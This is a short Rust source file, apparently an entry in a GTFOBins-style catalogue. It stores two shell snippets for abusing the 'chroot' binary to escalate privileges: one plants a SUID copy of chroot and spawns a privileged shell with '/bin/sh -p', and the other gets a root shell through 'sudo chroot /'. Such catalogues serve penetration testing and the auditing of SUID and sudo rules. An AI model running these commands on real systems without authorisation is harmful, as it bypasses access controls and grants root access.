
pub static BIN_NAME: &'static str = "chroot";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which chroot) .

    ./chroot / /bin/sh -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo chroot /
"#;
use crate::code::{Code, Tag};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
